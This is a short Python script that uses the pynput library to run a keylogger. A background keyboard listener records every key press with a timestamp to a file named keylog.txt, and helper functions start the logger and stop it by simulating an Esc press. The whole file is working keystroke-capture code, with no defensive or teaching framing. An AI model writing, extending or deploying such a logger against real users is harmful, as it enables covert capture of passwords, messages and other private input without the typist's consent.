from pynput.keyboard import Key, Controller, Listener
import logging


ctrl = Controller()

log_dir = "/"
logging.basicConfig(
    filename=("keylog.txt"),
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)


def on_key_press(key):
    logging.info(str(key))


def start_keylogger():
    listener = Listener(
        on_press=on_key_press,
        on_release=on_key_release
    )

    listener.start()


def on_key_release(key):
    if key == Key.esc:
        print("stoppin logger")
        return False


def stop_keylogger():
    ctrl.press(Key.esc)
    ctrl.release(Key.esc)
